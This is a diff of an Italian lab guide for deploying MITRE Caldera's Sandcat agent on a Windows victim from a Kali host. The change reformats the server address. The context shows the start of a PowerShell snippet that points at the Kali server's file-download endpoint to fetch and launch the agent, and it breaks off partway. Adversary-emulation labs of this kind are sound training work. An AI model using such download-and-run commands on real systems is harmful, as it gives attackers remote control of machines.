@@ -6,8 +6,11 @@ Seleziona la voce "+ Deploy an agent" e seleziona l'agent "Sandcat".
 Scegli il sistema operativo della vittima. 
 >(per l'attacco abbiamo usato il sistema windows come vittima)   
 
-Inserisci l'indirizzo ip di Kali "http://<IP Kali>:8888"
-Copia il codice presente sotto la voce "Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default."  
+Inserisci l'indirizzo ip di Kali
+```bash
+http://<IP Kali>:8888
+```
+Copia il codice presente sotto la voce "Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default."    
 ```bash
 $server="http://<IP Kali>:8888";
 $url="$server/file/download";
